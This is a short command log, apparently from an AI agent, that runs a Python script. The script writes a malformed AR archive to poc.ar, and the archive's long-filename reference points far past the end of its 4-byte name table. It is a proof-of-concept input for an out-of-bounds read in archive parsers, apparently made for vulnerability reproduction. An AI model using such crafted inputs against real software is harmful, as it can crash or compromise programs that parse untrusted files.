Running command: python3 -c "
import struct

# AR file magic
magic = b'!<arch>\n'

# Entry 1: Longfilename table (name starts with '//')
# Header format: name(16) + date(12) + uid(6) + gid(6) + mode(8) + size(10) + magic(2) = 60 bytes
name1 = b'//              '  # 16 bytes
date1 = b'0           '      # 12 bytes
uid1 =  b'0     '            # 6 bytes
gid1 =  b'0     '            # 6 bytes
mode1 = b'100644  '          # 8 bytes
size1 = b'4         '        # 10 bytes - small longnames table
hdr_magic1 = b'\x60\n'       # 2 bytes

header1 = name1 + date1 + uid1 + gid1 + mode1 + size1 + hdr_magic1
assert len(header1) == 60

# Longnames content - just 4 bytes
longnames_content = b'AB/\x00'  # 4 bytes

# Entry 2: References longfilename with out-of-bounds index
# /9999 means index 9999 into ar_longnames which only has 4 bytes
name2 = b'/9999           '  # 16 bytes
date2 = b'0           '      # 12 bytes
uid2 =  b'0     '            # 6 bytes
gid2 =  b'0     '            # 6 bytes
mode2 = b'100644  '          # 8 bytes
size2 = b'0         '        # 10 bytes
hdr_magic2 = b'\x60\n'       # 2 bytes

header2 = name2 + date2 + uid2 + gid2 + mode2 + size2 + hdr_magic2
assert len(header2) == 60

# Compose full file
data = magic + header1 + longnames_content + header2

with open('/workspace/poc.ar', 'wb') as f:
    f.write(data)

print(f'Written {len(data)} bytes')
print(repr(data))
"
